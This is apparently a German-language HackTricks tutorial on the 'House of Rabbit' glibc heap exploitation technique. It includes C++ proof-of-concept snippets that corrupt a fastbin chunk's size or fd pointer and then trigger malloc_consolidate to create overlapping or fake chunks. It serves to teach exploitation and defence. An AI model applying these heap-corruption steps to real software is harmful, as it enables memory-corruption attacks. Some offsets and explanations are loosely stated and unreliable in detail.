# House of Rabbit

{{#include ../../banners/hacktricks-training.md}}

### Anforderungen

1. **Fähigkeit, den fast bin fd-Zeiger oder die Größe zu ändern**: Das bedeutet, dass Sie den Vorwärtszeiger eines Chunks im Fastbin oder dessen Größe ändern können.
2. **Fähigkeit, `malloc_consolidate` auszulösen**: Dies kann erreicht werden, indem entweder ein großer Chunk zugewiesen oder der obere Chunk zusammengeführt wird, was den Heap zwingt, Chunks zu konsolidieren.

### Ziele

1. **Überlappende Chunks erstellen**: Um einen Chunk mit einem anderen zu überlappen, was weitere Heap-Manipulationen ermöglicht.
2. **Falsche Chunks fälschen**: Um den Allokator dazu zu bringen, einen falschen Chunk während der Heap-Operationen als legitimen Chunk zu behandeln.

## Schritte des Angriffs

### POC 1: Ändern der Größe eines Fast Bin Chunks

**Ziel**: Erstellen eines überlappenden Chunks durch Manipulation der Größe eines Fastbin Chunks.

- **Schritt 1: Chunks zuweisen**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
Wir allokieren zwei Chunks von jeweils 0x40 Bytes. Diese Chunks werden in die Fast-Bin-Liste aufgenommen, sobald sie freigegeben werden.

- **Schritt 2: Chunks freigeben**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
Wir geben beide Chunks frei und fügen sie der Fastbin-Liste hinzu.

- **Schritt 3: Chunk-Größe ändern**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
Wir ändern die Größenmetadaten von `chunk1` auf 0xa1. Dies ist ein entscheidender Schritt, um den Allokator während der Konsolidierung zu täuschen.

- **Schritt 4: `malloc_consolidate` auslösen**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Das Zuweisen eines großen Blocks löst die Funktion `malloc_consolidate` aus, die kleine Blöcke im Fast Bin zusammenführt. Die manipulierte Größe von `chunk1` führt dazu, dass es sich mit `chunk2` überschneidet.

Nach der Konsolidierung überschneidet sich `chunk1` mit `chunk2`, was weitere Ausnutzung ermöglicht.

### POC 2: Ändern des `fd` Zeigers

**Ziel**: Erstellen Sie einen gefälschten Block, indem Sie den Fast Bin `fd` Zeiger manipulieren.

- **Schritt 1: Blöcke zuweisen**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Erklärung**: Wir allokieren zwei Chunks, einen kleineren und einen größeren, um den Heap für den gefälschten Chunk einzurichten.

- **Schritt 2: Erstelle gefälschten Chunk**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
Wir schreiben gefälschte Chunk-Metadaten in `chunk2`, um kleinere Chunks zu simulieren.

- **Schritt 3: Freigeben von `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Erklärung**: Wir geben `chunk1` frei und fügen es der Fastbin-Liste hinzu.

- **Schritt 4: Ändere `fd` von `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Erklärung**: Wir ändern den Vorwärtszeiger (`fd`) von `chunk1`, um auf unseren gefälschten Chunk innerhalb von `chunk2` zu zeigen.

- **Schritt 5: Trigger `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Das Zuweisen eines großen Blocks löst erneut `malloc_consolidate` aus, das den gefälschten Block verarbeitet.

Der gefälschte Block wird Teil der Fastbin-Liste, wodurch er zu einem legitimen Block für weitere Ausnutzung wird.

### Zusammenfassung

Die **House of Rabbit**-Technik beinhaltet entweder die Änderung der Größe eines Fastbin-Blocks, um überlappende Blöcke zu erstellen, oder die Manipulation des `fd`-Zeigers, um gefälschte Blöcke zu erstellen. Dies ermöglicht Angreifern, legitime Blöcke im Heap zu fälschen, was verschiedene Formen der Ausnutzung ermöglicht. Das Verständnis und die Übung dieser Schritte werden Ihre Fähigkeiten zur Heap-Ausnutzung verbessern.

{{#include ../../banners/hacktricks-training.md}}
